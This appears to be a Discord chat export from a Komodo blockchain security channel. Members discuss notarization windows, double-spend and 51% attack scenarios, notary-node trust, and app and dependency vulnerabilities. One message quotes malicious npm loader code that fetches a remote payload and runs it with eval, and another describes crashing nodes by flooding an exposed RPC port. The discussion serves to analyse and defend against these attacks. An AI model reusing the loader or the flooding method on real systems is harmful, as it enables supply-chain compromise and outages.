Hi, Could someone tell me what an ISP would think was going on when analyzing Barterdex traffic (2 native coins)?


[27-Aug-18 11:43 AM] tolken#2655
dPOW - considering dPOW backs up every 10min, does that mean there’s a 10min window where someone can send funds to an exchange, then cash out and effectively steal funds? I know dPOW isn’t a perfect solution (what ever is really?) but this seems like a big hole, but I think jl777 has mentioned the cost/risk makes it not generally practical.  I know something like this has been asked before, so if anyone has a link that might shed more light on this I’d appreciated it 😃


[27-Aug-18 11:43 AM] jl777c#5810
if an exchange doesnt wait for notarization, then certainly such things can be done


[27-Aug-18 01:04 PM] tolken#2655
Awesome, that sounds pretty damn great if that’s the only real situation is someone not waiting 10min 😃


[27-Aug-18 01:11 PM] jl777c#5810
yes, well as long as it didnt miss a notarization round, which does happen at times. there is even an api to check for the notarization lag


[29-Aug-18 11:26 AM] Prado#3941
Hi i was wondering if there is a Komodo Secure Pool in place or in plans that does or will do something of this 3 things:


[29-Aug-18 11:26 AM] Prado#3941
1: Redistribuite hash power to Komodo Chains avoiding effective or useful 51% percent attacks in the 10 minutes window


[29-Aug-18 11:27 AM] Prado#3941
2: Using dPOW to notarize the block winners of every chain


[29-Aug-18 11:28 AM] Prado#3941
3: Analizing minners in real time and saving their data in a chain for transparent analysis, security and rewards


[29-Aug-18 11:31 AM] Prado#3941
If there isn´t, how can we organize a team to build it (its very important for me that small, non market cap chains have a strong hash security option as well), should i just build it with my team?


[29-Aug-18 11:34 AM] Prado#3941
@jl777c  this will effectively add a rent security (and CDN) feature for all chains compatible with the pool (obviously komodo first) and the option to avoid non secured hashes (outside notarized pools) which i think will become a standard in years to come, as https notarized hash


[29-Aug-18 11:47 AM] jl777c#5810
it is a good idea for a mining pool to secure assetchains. dPoW is already notarizing all the notarized assetchains


[29-Aug-18 02:46 PM] Alright#0419
@Prado what can an attacker accomplish with a 10 minute reorg?


[29-Aug-18 03:05 PM] Deleted User#0000
Dont they have to successfully attack bitcoin at the same time within those 10 minutes? *asking for a mate


[29-Aug-18 04:25 PM] Prado#3941
@Alright  in big chains almost anything, my concern is for small dapps, icos and projects, where 10 minutes it´s enough, and what i think it could be happen it´s been attacked for days in lapses of 5 or 7 minutes before you realize you lost half the tokens or someone stole millons from your ico, or someone corrupted the logics of an app by double spending, in some cases tokens will be a physical representation, imagine you give 10,000 usd of inventory through tokens, just to realize you were victim of a double spending attack (that could destroy both small business, startups and komodo it self)


[29-Aug-18 04:26 PM] Alright#0419
just don't let them get anything of value within those 10 minutes


[29-Aug-18 04:26 PM] Alright#0419
but I agree, could definitely mess with dapps


[29-Aug-18 04:27 PM] Prado#3941
i mean that would be a short time answer, but for some apps 11 minutes confirmation will take them back to legacy backends and solutions


[29-Aug-18 04:28 PM] Prado#3941
if you could rely on trusted hashes that will solve almost everything


[29-Aug-18 04:29 PM] Prado#3941
and the techonology could be available for any pool to implement dPOW so it could inject serious FIAT or capital into KMD coin


[29-Aug-18 04:46 PM] Alright#0419
Not sure I quite understand what you mean by trusted hashes


[29-Aug-18 04:46 PM] Alright#0419
as in only certain people can mine the chain?


[29-Aug-18 04:47 PM] Alright#0419
that would be useful

I wouldnt do it on official notary keys as the wallets would get destroyed. But something similar seems like a good idea.


[30-Aug-18 09:08 AM] Prado#3941
exactly the most cool of all, is that you could use the hashes of non trusted miners to find blocks but if the block winner is not written in the chain of the pool you can ignore the rewards for those miners, with a 3 factor authentication for pools (secure hash sign,  written block winner, and dPOW request confirmed) you solve 51% attacks without loosing decentralization as anyone can implement the dPOW tech of komodo


[30-Aug-18 09:09 AM] Prado#3941
Because this requires high speed dPOW it needs to live in the komodo chain before going to bitcoin in 10 minutes, or it will be both too slow and too expensive to actually been implemented


[30-Aug-18 12:12 PM] PTYX#6840
Anything that secures the chains further is welcomed


[30-Aug-18 12:13 PM] PTYX#6840
I guess an asset chain can fork each year to add the new notary nodes so only NNs can mine


[30-Aug-18 02:07 PM] Prado#3941
NNs is notarized nodes? it sounds cool


[30-Aug-18 02:23 PM] Prado#3941
In strict sense a fork is not needed just a protocol, if the pools comply with the dPOW protocol the nodes accept them, it will require to check the transaction written in the chain (when a block is rewarded) and a status confirmation from komodo verifying constant dPOW of the pool chain and confirmation from the last rewarded blocks already notarized, rewards can be kept on hold until pools notarizes past rewards (making impossible to accumulate not notarized blocks)


[30-Aug-18 02:28 PM] Prado#3941
The protocol could be written in different languges so developers of different coins could implement the protocol in minutes, making all pools implement an assetchain in the next years


[30-Aug-18 02:31 PM] jl777c#5810
there is an api that pools and exchanges can use to find the last notarized block, dynamic lag and it can be done


[30-Aug-18 02:31 PM] Prado#3941
exactly


[30-Aug-18 02:32 PM] jl777c#5810
https://komodostats.com/api/notary/summary.json


[30-Aug-18 02:32 PM] Prado#3941
you could concentrate 99% of the hash power as long as you notarize your winnings


[30-Aug-18 02:32 PM] jl777c#5810
it already exists, pools and exchanges just have to use it


[30-Aug-18 02:33 PM] Prado#3941
Nodes would have to comply as well?


[30-Aug-18 02:33 PM] Prado#3941
otherwise pools and exchanges could simply ignore the api


[30-Aug-18 02:35 PM] jl777c#5810
if value is not being transfered until notarized, then double spends are not an issue


[30-Aug-18 02:36 PM] jl777c#5810
in order to double spend, there needs to be 2 spends (and typically a transfer of value from the 1st one to some other form)


[30-Aug-18 02:38 PM] Prado#3941
But it keeps the system with 10 minutes confirmation for transactions which happen 1000X times than blocks rewards, wouldn´t be better to put lag on rewards and not in transaction confirmations?


[30-Aug-18 02:40 PM] jl777c#5810
onchain doesnt matter as if it is reorged, it is reorged and like it didnt happen


[30-Aug-18 02:40 PM] jl777c#5810
only issue is when there is a transfer to some external item, like BTC via exchange


[30-Aug-18 02:41 PM] jl777c#5810
you are trying to solve a problem that isnt an actual problem


[30-Aug-18 02:41 PM] Prado#3941
Yeah, particulary exchange of tokens or coins for physical goods


[31-Aug-18 07:13 PM] Prado#3941
We could build a notarized pool and a security complement for dapps that reviews if nodes transactions or blocks are compromised (by not notarized miners and nodes) it will be really easy to add it in feature releases and we could put it publicly available to any dapp or assetchain that wants extra security wihtout white/black listing


[31-Aug-18 07:15 PM] Prado#3941
We can build an API to the assetchain core functions, so any pool in the world can implement the standard in relative no time. (komodo ones will be te most important for my projects but its the same for all)

10/21/18 Blockchain Attack – Lethean – Medium
On 10/21/18 at approximately 00:00 UTC, it became clear to us that a malicious entity had attacked the LTHN blockchain. Until more…


[22-Oct-18 07:32 AM] dukeleto#7326
That attack requires at least 51%+ hashrate to pull off, and then exploits another issue


[02-Nov-18 09:33 AM] luke#8628
hello! someone mentioned a possible attack to me that would impact atomic swaps, and I was curious how barterDEX handles it. Let's say Alice wants to send BTC to Bob and receive ETH in return. My understanding is that Alice initiates the order, and a Bob accepts. Alice sends her deposit, which is 0.15% of the amount of BTC she plans to send. If Alice was malicious, after she sends her deposit, couldn't she sit around for 9 minutes until right before the next block is made on Bitcoin, to see if it is still favorable for her to make the trade (since the price of BTC may have changed by a lot more than 0.15% that she paid as deposit) and if she decides the trade is no longer beneficial to her, just not send her BTC effectively cancelling the trade? sure she would lose her deposit, but it would be a lot less than the amount she may lose on the trade. seems like attackers may try to take advantage of something like this. is this a known issue for atomic swaps? is it addressed by barterDEX?


[02-Nov-18 09:39 AM] Deleted User#0000
The dex fee is less than that, and its not a deposit, its a fee, alice pays it and never gets it back.


[02-Nov-18 09:41 AM] luke#8628
ah, ok. I guess that would make this issue worse then right? because alice doesn't even need to consider getting her dex fee back. she is even more incentivized to cancel if not favoriable for her.


[02-Nov-18 10:04 AM] Deleted User#0000
She cant get it back


[02-Nov-18 10:32 AM] luke#8628
right, so she will be even more incentivized to not send her payment if the price of BTC changes in a direction that is unfavorable for her


[02-Nov-18 01:05 PM] jl777c#5810
until the trade is completed, it isnt completed and will be undone, other than the alicefee. for this fee, alice does get to play around with slippage, but realistically BTC wont usually be changing 5% in price during an atomic swap


[02-Nov-18 01:05 PM] jl777c#5810
also a node that is bailing out half the time will soon get black listed and nobody would want to trade with your node


[02-Nov-18 01:05 PM] jl777c#5810
and making a new account would make you have to start building reputation from scratch

[13-Dec-18 10:34 AM] Alex Skidanov#8668
Hi, question.

Say a small chain with little hash power is completely overtaken (90% of hashpower is malicious), creates a completely invalid block, i.e. it mints 1B tokens on one of the accounts out of thin air, then builds 1000 otherwise valid blocks on top of it, and then initiates a cross-shard tx by burning those 1B tokens.

Would Komodo somehow spot that those 1B tokens originate in an invalid block?


[13-Dec-18 10:36 AM] jl777c#5810
the key words there is "invalid block"


[13-Dec-18 10:36 AM] jl777c#5810
an invalid block will be rejected by all nodes


[13-Dec-18 10:36 AM] jl777c#5810
doesnt matter how much hashrate you have


[13-Dec-18 10:42 AM] Alex Skidanov#8668
so all nodes in Komodo validate all blocks in all chains?


[13-Dec-18 10:43 AM] jl777c#5810
no, why would it have to?


[13-Dec-18 10:43 AM] jl777c#5810
only nodes for chainX validate tx and blocks in chainX


[13-Dec-18 10:44 AM] Alex Skidanov#8668
right, so if 90% of chainX hashpower is controlled by malicious nodes, who will detect that the chain they build has an invalid node?


[13-Dec-18 10:44 AM] jl777c#5810
the nodes for chainX


[13-Dec-18 10:44 AM] ComputerGenie#7004
all nodes in all useful chain currencies validate all blocks in all chains


[13-Dec-18 10:44 AM] jl777c#5810
you have it backwards


[13-Dec-18 10:44 AM] jl777c#5810
unless the new block is valid, it wont be accepte


[13-Dec-18 10:44 AM] jl777c#5810
a single invalid tx makes a block that has it invalid


[13-Dec-18 10:45 AM] jl777c#5810
it is a decentralized system, the blockchain


[13-Dec-18 10:45 AM] jl777c#5810
no central source, or hashrate dominator can just declare an invalid tx is valid


[13-Dec-18 10:46 AM] ComputerGenie#7004
`if 90% of chainX hashpower is controlled by malicious nodes`
they will be mining on their own chain that isn't recognized by legitimate nodes (because despite what CSW says, not all nodes are miners)


[13-Dec-18 10:46 AM] Alex Skidanov#8668
I think my understanding of cross-shard TXs is then lacking.

For a cross-shard TX a "burn" needs to happen. My understanding is that "burn" is an event that happens in a block in the source blockchain (call it chainX). Say the receiving chain is chainY.

Say 90% coalition in chainX creates an invalid chain in chainX that has an invalid block in it far in the past. They then create a block in that chain with an invalid block in which they do the "burn" and send such block to the chainY. How would chianY know the chain has an invalid block in it?


[13-Dec-18 10:46 AM] Alex Skidanov#8668
Is it expected that whomever accepts the transaction in chainY validates the entire chainX?


[13-Dec-18 10:48 AM] ComputerGenie#7004
`How would chianY know the chain has an invalid block in it?`
Because "invalid" by definition goes against consensus rules (as dictated by nodes, not miners)


[13-Dec-18 10:49 AM] Alex Skidanov#8668
But isn't it nodes that operate chainX that know the block is invalid?
How would nodes that operate chainY and receive the cross-shard TX know that the chain is invalid?


[13-Dec-18 10:50 AM] ComputerGenie#7004
_doesn't know momom enough to answer in detail here_


[13-Dec-18 10:50 AM] jl777c#5810
because the notaries that notarize chainY notarize valid blockhash and merkleroots


[13-Dec-18 10:50 AM] Alex Skidanov#8668
I see. The notaries assigned to chainX that notarize to Komodo chain / Bitcoin validate all the blocks?


[13-Dec-18 10:51 AM] jl777c#5810
notaries that notarize a chain run a full node for that chain


[13-Dec-18 10:51 AM] Alex Skidanov#8668
Makes sense, running a full node by definition validates all the blocks


[13-Dec-18 10:51 AM] jl777c#5810
ALL the notaries need to agree on the notarization, including MoMoM data


[13-Dec-18 10:52 AM] jl777c#5810
it is stronger. the notaries cross check the chain it is being notarized to


[13-Dec-18 10:52 AM] jl777c#5810
so you know it is not only valid but notarized and not reorged

All notaries in Komodo validate all chains, or different notaries are assigned to different chains?


[13-Dec-18 10:52 AM] jl777c#5810
for now most notaries notarize most chains


[13-Dec-18 10:53 AM] jl777c#5810
the incentive is automatic reelection


[13-Dec-18 10:53 AM] Alex Skidanov#8668
Makes sense. But obviously long term you want to scale to an extent where most notaries would only be able to notarize a small fraction of the chains, right?


[13-Dec-18 10:53 AM] Alex Skidanov#8668
I guess the "100M tx/second" relies on that assumption?


[13-Dec-18 10:58 AM] jl777c#5810
the assumption is that notaries will be able to manage many nodes


[13-Dec-18 10:58 AM] jl777c#5810
for 100 mil tx per second, it would require half a million chains! i dont think anybody said 100 million tx/sec anytime soon


[13-Dec-18 11:03 AM] Alex Skidanov#8668
well, 100m was mentioned in one of the post as a theoretically possible limit, not something short term :)

so the statement "security of Komodo relies on most notaries running most chains" is correct? (I don't necessarily think it's a bad thing, just trying to confirm my understanding)


[13-Dec-18 11:05 AM] jl777c#5810
security of KMD relies on the notaries, yes


[13-Dec-18 11:05 AM] jl777c#5810
of the entire ecosystem


[13-Dec-18 11:05 AM] jl777c#5810

Hello!  I'm working in a space where we are diving into a few insurance projects that will require notaries and have been discussing how the use of a 3rd party notary can be standarized


[07-Feb-19 08:20 AM] spaul#5353
any approved literature on the notarized nodes?

@spaul also, for that kind of use case where there may be more control of notaries, e.g. your insurance consulting firm or the actual insurance companies wanting to run their own notary network, the #kmdlabs project are doing R&D into that aspect of it, because some environments will want to manage their own incentive structures, opsec, etc.


[07-Feb-19 12:29 PM] Mylo#8306
e.g.
```
SPAUL INSURANCE NN ---> KMD ---> BTC
MYLO CONSULTING FARM NN ---> KMD ---> BTC
```
then the actual KMD ---NN---> BTC elections, the different NN networks that exist may want to run for the annual elections etc.   but this may be something for 2020, 2021 in the strategic thinking of some of your types of  projects/companies/consulting etc.

as far as i know you were involved in the creation of the PAN token for the exchange Bitpanda, wouldn't Bitpanda also be a candidate for dPoW?


[15-Feb-19 11:07 PM] Mylo#8306
sorry i've not heard of PAN token.  if it's a bitcoin/zcash/litecoin/dash fork, yes - dPoW has been implmeneted on projects that started off as forks.   there are some differences between a v0.11 btc fork and v0.14 fork (e.g. segwit etc.) so depends when the fork was as to how many code changes required.   but all do-able.

not really sure what's your question
it's a 3rd party api like any other api
they don't use any security tokens so i'd say it's somewhat degraded level
make sure you don't leak your api key anywhere

Hi all. I am new to this discord, and the amount of information here is a bit overwhelming, so my excuses if I ask questions that have been asked before.


[30-Mar-19 06:28 AM] yope#8519
I am investigating Komodo security and have questions that I assume others have asked before. Nevertheless I have not been able to find some sort of FAQ or other resource answering simple questions like this for example: "Why is the use of curated notary nodes any different than just trusting some central authority for snapshotting the main chain in a simple database?"


[30-Mar-19 06:29 AM] yope#8519
If anyone has a pointer to a source that addresses these kind of questions, that's be appreciated.


[30-Mar-19 06:31 AM] yope#8519
But the public keys of the notary nodes are included in the source code, right?


[30-Mar-19 06:31 AM] yope#8519
So I cannot run a notary node, right?


[30-Mar-19 06:32 AM] yope#8519
Who are stake holders?


[30-Mar-19 06:32 AM] yope#8519
So that makes it have the same drawbacks of PoS, right?


[30-Mar-19 06:34 AM] yope#8519
Voters with more stake have power to influence consensus.


[30-Mar-19 06:34 AM] yope#8519
Notary nodes have a mining advantage, right? They can mine at lower difficulty.


[30-Mar-19 06:36 AM] ComputerGenie#7004
if one were to assume that voters could influence NNs, then their power of influence would only be over the lowest performing NNs anyway


[30-Mar-19 06:37 AM] ComputerGenie#7004
the highest performing NNs get "auto" re-elected based on performance


[30-Mar-19 06:37 AM] yope#8519
Isn't it true that If one entity accumulates enough staking power, he could eventually chose most or all NN's?


[30-Mar-19 06:37 AM] ComputerGenie#7004
and "at worst" the "influence" would only extend to holding back blocks of the least performing NNs anyway


[30-Mar-19 06:38 AM] yope#8519
Holding back blocks opens a window of 51% attacks on the KMD chain....


[30-Mar-19 06:38 AM] yope#8519
Not exactly harmless, right?


[30-Mar-19 06:39 AM] ComputerGenie#7004
`Holding back blocks opens a window of 51% attacks on the KMD chain....`
No, because those "susceptible" are, by definition, producing less to begin with


[30-Mar-19 06:40 AM] yope#8519
@ComputerGenie , how is an NN's "performance" determined?


[30-Mar-19 06:40 AM] ComputerGenie#7004
by performing notarizations and producing KMD blocks


[30-Mar-19 06:41 AM] yope#8519
@Deleted User , sorry to be critical about this, but I am not convinced of that yet...


[30-Mar-19 06:41 AM] yope#8519
I am here to learn and discover truth


[30-Mar-19 06:42 AM] yope#8519
@Deleted User, but if said whale gets hold of a few NN's, he has a significant mining advantage, so he could even outmine the rest of the network in a 10minute window if the network is sufficiently weak.


[30-Mar-19 06:44 AM] yope#8519
What do you mean by that? Isn't KMD using PoW (if we discount the NN's for a moment)?


[30-Mar-19 06:44 AM] ComputerGenie#7004
between the dev nodes and top NNs keeping their jobs by doing their jobs, there's not a "breaking point" where stopage could be bought
even if you assume that all but minsig NNs were corrupted, that 1 group would negate the stoppage of all the rest


[30-Mar-19 06:47 AM] ComputerGenie#7004
` Isn't KMD using PoW (if we discount the NN's for a moment)?`
You can't "discount the NNs", because their notarizations are akin to live checkpoints


[30-Mar-19 06:47 AM] yope#8519
@Deleted User , But that KMD mining is done via PoW, right? So if you have access to vast hashing power, and control a few NN's, that would make it easier to outmine the rest of the network in the 10 minute snapshot window, right?


[30-Mar-19 06:48 AM] yope#8519
Not in the 10 minute window


[30-Mar-19 06:49 AM] ComputerGenie#7004
`But that KMD mining is done via PoW, right? So if you have access to vast hashing power, and control a few NN's, that would make it easier to outmine the rest of the network in the 10 minute snapshot window, right?`
You can't negate the checkpointing that the majority of NNs do if you only control "a few" and if you control all *but* "a few", you can't negate the checkpointing that those few do


[30-Mar-19 06:49 AM] yope#8519
Ok, so if an attacker controls a few NN's, he has an added mining advantage (lower difficulty) and that could help him outmine the rest of the network in that 10 minute window, right?


[30-Mar-19 06:50 AM] yope#8519
@ComputerGenie I am not saying I take over the NN's chekpointing work, just control some of them to gain mining power.


[30-Mar-19 06:51 AM] yope#8519
What do you mean by that?


[30-Mar-19 06:51 AM] yope#8519
Who can't chose when to mine?


[30-Mar-19 06:52 AM] yope#8519
Yes, but if the network has decided that I get a few NN's (because I am a staking whale), I can "easy mine" whenever and however much I chose, right?


[30-Mar-19 06:52 AM] ComputerGenie#7004
The only "successful" theory would involve controlling 52 NNs

[30-Mar-19 06:53 AM] yope#8519

[30-Mar-19 06:53 AM] ComputerGenie#7004
yes


[30-Mar-19 06:53 AM] yope#8519
Why can't I chose?


[30-Mar-19 06:53 AM] ComputerGenie#7004
if you control less than 52 NNs, then 13 can still notarize


[30-Mar-19 06:53 AM] yope#8519
How's that?


[30-Mar-19 06:54 AM] yope#8519
@ComputerGenie , with all due respect, let @Deleted User answer, I think he understands my question. You OTOH do not...

[30-Mar-19 06:55 AM] yope#8519
He keeps coming with the 51 NN argument, but I am not debating that.


[30-Mar-19 06:56 AM] yope#8519
Ok, but I am one and you are two, and out-typing both of your answer storms is not that easy.... 😅


[30-Mar-19 06:57 AM] ComputerGenie#7004
but that's the point, the power is meaningless to go back past the checkpoint
all the power in the world is negated by 1 tx/block


[30-Mar-19 06:57 AM] yope#8519
@ComputerGenie , I am not debating that. I know that. But there are 10 minutes between snapshots, right?

{Reactions}
💯 

[30-Mar-19 06:59 AM] ComputerGenie#7004
on average, yes
so, you can roll back 12 blocks and have 1 confirmation on your "controlled" tx
what are you doing with that 1 confirmation?


[30-Mar-19 06:59 AM] yope#8519
I want to understand the risks of attacking the network in between these checkpoints successfully.


[30-Mar-19 06:59 AM] ComputerGenie#7004
in between checkpoints, transactions never get a 2nd confirmation


[30-Mar-19 07:00 AM] yope#8519
Why not? Aren't there many blockes mined in that timeframe?


[30-Mar-19 07:00 AM] yope#8519
One each 1 minute and 2 seconds, right?


[30-Mar-19 07:01 AM] ComputerGenie#7004
rawconfirmations increase with blocks
confirmations stay at 1 until notarized, at which point confirmations = rawconfirmations


[30-Mar-19 07:01 AM] yope#8519
But that would make confirmations as slow as on BTC....


[30-Mar-19 07:01 AM] yope#8519
🤔


[30-Mar-19 07:02 AM] yope#8519
Ok.


[30-Mar-19 07:03 AM] ComputerGenie#7004
`But that would make confirmations as slow as on BTC....`
*only* to that 1st number, after that confirms = blocks
if you need 20 confirms, as a general rule, that will equal 20 blocks


[30-Mar-19 07:04 AM] yope#8519
Well... I have only spent 2 hours or so looking at the whitepaper and the code on github.


[30-Mar-19 07:04 AM] yope#8519
I am far from convinced yet.


[30-Mar-19 07:05 AM] ComputerGenie#7004
not even sure 2 hrs is enough time to look at the PoS code, much less the code from a security aspect


[30-Mar-19 07:06 AM] yope#8519
Absolutely right


[30-Mar-19 07:06 AM] yope#8519
That's why I say I am far from convinced.


[30-Mar-19 07:07 AM] yope#8519
I don't think Komodo has had enough scrutiny and attack by a big margin to say anything about the security.


[30-Mar-19 07:08 AM] yope#8519
You mean the EMC2 attack?


[30-Mar-19 07:09 AM] yope#8519
There are contradicting stories about that, so I don't know who to believe...


[30-Mar-19 07:09 AM] ComputerGenie#7004
I can think of 5 things that were done just because of an attack theory and with any due respect, the EMC2 "attack" was laughable


[30-Mar-19 07:11 AM] yope#8519
Ok, but it depends on how you look at that... if you see a trend there of "successful attack --> fixed", then we can expect more successful attacks, right 😉


[30-Mar-19 07:14 AM] yope#8519
Thanks a lot for helping me out. I will investigate further. If I have more questions, I'll be back.


[30-Mar-19 07:14 AM] ComputerGenie#7004
@yope I'm not naive enough to believe that there are 0 vectors, just sure that the idea you were asking about isn't one of them


[30-Mar-19 07:15 AM] yope#8519
Ah, but back to my original question: Isn't there a sort of FAQ or other document with answers to these questions, which I assume I am by far not the only one asking?

How come KMD dont make a private blockchain and notarize to it? then no btc would be required to be spent and notarizing would be literally for free


[30-Mar-19 07:21 AM] Markus#5464
but having 64 notary nodes is sort of centralized aswell if we think that way

`How come KMD dont make a private blockchain and notarize to it?`
One of the reasons I can think of is "what if it becomes known/compromised?", if that ever happened, security would be nonexistent (and the de/centralized thing)

How? There are a few bigger mining pools, but there are still a lot of individual miners...

`a lot of individual miners...

each of them are generally meaningless in the system, as they generally don't control nodes for more than 1-4 minute intervals

The individual miners are.


[30-Mar-19 07:33 AM] ComputerGenie#7004
yes, in a consensus manner; because, almost no miners ever know what consensus code their pool is running
which makes the miners moot


[30-Mar-19 07:34 AM] yope#8519
Still, the bitcoin network would reject a block with incorrect transactions in it...


[30-Mar-19 07:34 AM] ComputerGenie#7004
there's more to consensus than just tx confirmation


[30-Mar-19 07:36 AM] ComputerGenie#7004
it's entirely possible for Core to create consensus code that disallows any blocks to connect that are created by ClientX, just on client tag and nothing else (all else being equal)


[30-Mar-19 07:36 AM] ComputerGenie#7004
assuming pools run agreeing code


[30-Mar-19 07:37 AM] ComputerGenie#7004
consensus code, literally, defines what is/isn't acceptable


[30-Mar-19 07:38 AM] ComputerGenie#7004
`if pool owners really want to double spend or censor transactions, they can`
the latter is exceptionally easy


[30-Mar-19 07:40 AM] ComputerGenie#7004
As much as I like to bag on Core, I think they would rollback an economically significant ds

indeed

I still don't think it is that easy that pool owners can collude while miners just keep obeying them.


[30-Mar-19 07:44 AM] yope#8519
Why do you think that is possible?


[30-Mar-19 07:45 AM] ComputerGenie#7004
I'd estimate that 80% of miners wouldn't know anything that happened unless it was on reddit or twatter, and even then I don't think they'd understand


[30-Mar-19 07:46 AM] ComputerGenie#7004
the majority of miners don't even understand the basics and a large portion have never even had a client and/or privkey


[30-Mar-19 07:47 AM] yope#8519
Yes, but I don't think that pool owners get hold of the blocks. If it was like that, someone would have called them out long ago.


[30-Mar-19 07:49 AM] yope#8519
The article you linked even says it: Pool owners concentrate hash power, but don't control it.

People ignore what they want, BM has been "called out" 1000 times for "covert" things and no one cares (partly because no direct evidence, partly because they just don't care as long as they get their $2)

Op Ed: Bitcoin Mining Attacks Are Overblown
The question here is whether bitcoin mining is a single point of failure. Could a government or other authority control Bitcoin through controlling a single entity in mining? What would it actually take to “take over”?

If I do a 51% and you "call me out", what good is your claim unless you can actively show what I did?


[30-Mar-19 07:54 AM] yope#8519
@ComputerGenie What I meant by calling out is that if pool owners actually could control the hashing power they concentrate, that would be a known fact by now.

`if pool owners actually could control the hashing power they concentrate, that would be a known fact by now.`
You mean like the literal pages slush has allowing miners to vote on consensus options?

tl;dw;
The past three years of vulnerability research and cryptanalysis has not been kind to the JOSE family of Internet standards (most commonly known as JSON Web Tokens a.k.a. JWT). This has led to many security experts declaring boldly, "Don't use JWT!" but has left many developers in want of a viable alternative.

Hi @everyone. 

After more than 4 months of trying to have BAY listed on the OEX exchange, we have had to concede to the fact that they have stolen our listing fee and will not be listing us. 
We have tried many times to get an exact date of listing and each time there has been a delay with various excuses.
Knowing we have had 3 BTC stolen which could have been spent on marketing or put towards another exchange listing is very frustrating. We will look into legal options to try and recover the fees, as long as it isn’t too expensive of course.
Please feel free to share this news on social media or other chats, and let’s help to make sure no other projects are scammed into losing money from this exchange.


[21-May-19 01:48 PM] vicmao#2684
Beware of OEX exchnge... BitBay paíd a listing fee, haven't been listed and they don't Payback It back. I'm a Komodo holder and a BitBay holder too.

```Step 0. Follow the security checklist recommendation

First step is to download this website from Github and open the index.html file directly from your computer. It's just too easy to sneak some evil code in the 6000+ lines of javascript to leak your private key, and you don't want to see your fund stolen. Code version control make it much easier to cross-check what actually run. For extra security, unplug your Internet access while generating your wallet. ```

@Deleted User We found a bug in the native implementation of the `ionic-webview` plugin. To serve the content, they started an internal server. But this server is accessible to the whole operating system, so if you manage to start your own server before it, then someone could inject any code into your app. Granted, it's not that easy to exploit. But not only crypto-currency related apps were affected, we even found a microsoft app that was affected. Here's a small proof of concept video we made: https://www.youtube.com/watch?v=RR1r323otOQ

for the app?


[05-Jun-19 02:14 PM] Andy#1801
You will have to release an app to the app store, but the webserver keeps running for minutes after the app has been suspended


[05-Jun-19 02:14 PM] Andy#1801
You can set it in the config, but everyone leaves it on the default


[05-Jun-19 02:15 PM] Andy#1801
But the webserver is now gone from the plugin, so this is not an issue anymore


[05-Jun-19 02:16 PM] Andy#1801
And it might seem like it's hard to exploit, but if you release some kind of "companion app" for bitpay, for example a contact book or something that then deeplinks into bitpay (not sure if they enabled it), then it would be very easy and completely invisible to the user.

true


[05-Jun-19 02:17 PM] Andy#1801
But the apps we reported it to did fix it fast, so it was all good


[05-Jun-19 02:17 PM] Andy#1801
That attack would also have to be planned really well, so I guess it's easier to just inject code into some random npm dependency 😃


[05-Jun-19 02:18 PM] Andy#1801
Do you manually review (the code) of the dependencies you use?


[05-Jun-19 02:18 PM] Andy#1801
I have always taken a look at the dependencies we use (author, if it's maintained, etc.), but you would also have to check the compiled code on npm to be completely sure


[05-Jun-19 02:19 PM] Andy#1801
I'm now thinking about simply copy/pasting the dependencies directly into our app, at least the ones that don't have too many dependencies themselves


[05-Jun-19 02:19 PM] Andy#1801
And then you just have to check updates manually


[05-Jun-19 02:20 PM] Andy#1801
Ideally there would be a way to "recursively" add dependencies directly from github, so it would always pull the source rather than some minified version


[05-Jun-19 02:21 PM] Andy#1801
But you would still have to review every sub dependency...


[05-Jun-19 02:22 PM] Andy#1801
It's like, once you go down that rabbit hole, you'll probably only be doing dependency review the whole day. But especially in our field it is getting more and more important.


[05-Jun-19 02:24 PM] Andy#1801
Anyway, I'm curious how this attack looked like exactly, then we can think about how we can protect ourselves from it in the future.

it might be different in node

but in the browser you can overwrite window.crypto.getRandomValues and it is changed EVERYWHERE it is used

The only thing you can do is create a secure copy of that function at the beginning of your code, so in the case of an app in your index.html

There is an interesting TC39 proposal open that would solve this problem by introducing proper scoping, or "realms" into javascript: https://github.com/tc39/proposal-realms

So the only further information I found was this, someone uploaded the source of the `electron-native-notify` dependency. But it seems that the payload has been loaded from a server. Does anyone have the payload?

```
try {
    (process && "renderer" === process.type ? require("electron").remote.require : require)("https").get("https://updatecheck.herokuapp.com/check", res => res.on("data", d => {
        try {
            eval((atob || (e => "" + Buffer.from(e, "base64")))("" + d))

I'm developing a gaming platform where users will rate an item. What methods do you recommend taking to stop bots, malicious actors, and miceoworkers from spamming the system. I've been told micro transactions fees to rate, identity verification, any others?

proof of gameplay won't stop the bots, but it will allow ppl to earn their right to rate after playing

The game poroof of play requries all key press to be sent to blochain as fast as possible... by adding txpow you just slow it down so it wont work any more


[21-Aug-19 01:01 AM] polycryptoblog#1173
He was asking about rating items, not proof of gameplay.


[21-Aug-19 01:14 AM] Mylo#8306
Yeah rate limiting by using computing power would reduce imo.  Depends on market though.  Spending $15 a week on constant ratings might have thousands of upside....need more info really - but if its competitive amongst projects for player mindshare, the adversarial side of "doing business" will do what it wants off-chain


[21-Aug-19 01:15 AM] Deleted User#0000
Why not just make it so that they can onlyt appear once every X blocks?


[21-Aug-19 01:16 AM] Deleted User#0000
Seems much simpler and less wasteful


[21-Aug-19 01:16 AM] Deleted User#0000
Send a marker to some address, and that cannot be spent until X blocks have passed. 
That marker must be spent to create the next item


[21-Aug-19 01:20 AM] Mylo#8306
Global rating limits? Eg 10 markers (ratings) every 5 blocks?


[21-Aug-19 01:21 AM] Mylo#8306
It could, and again depends on all the other info.  Marker would work

Eg, I create MYLO tokens, find out my business partner is about to sell some illegally to a 3rd party, can put a pause marker until it can be resolved.  Or say in a game situation, the championship has just been won, the game takes a 1 week competition break/holiday.

thanks @phm87  - yea, we should never expose an rpc interface to external (unknown) conns. There is even a much worse unpatched vuln around - hammer a coin daemons rpc interface with few thousand simul. requests and you ll get the node to crash. Pre-req for this attack: nodes rpc interface is "public" and has non-limited rpc worker queue...


[23-Nov-19 01:17 AM] phm87#7395
yes, I discussed a little bit with dukeleto about this


[23-Nov-19 01:18 AM] phm87#7395
in any case, when an attacker is able to use the RPC calls, he can do what he wants and  it is not limited to this CVE.


[24-Nov-19 04:39 AM] dukeleto#7326
the CVE covers anything that is allowed to connect to the port, not just things with have a user+pass. That is a subtle point and means everything on localhost could elevate the attack. This makes it so if you can get access to an unpriveledged user on the same machine, you can launch this attack


[24-Nov-19 04:40 AM] dukeleto#7326
this is considered "fucked" already for most coins. Having malicious users on the same machine opens you up to side channel attacks, which Zcash is not designed for (see the latest Zcash CVEs) and so this CVE isn't super critical

The FBI found Eric Marques by breaking the famed anonymity service Tor, and officials won’t reveal if a vulnerability was used. That has activists and lawyers concerned.

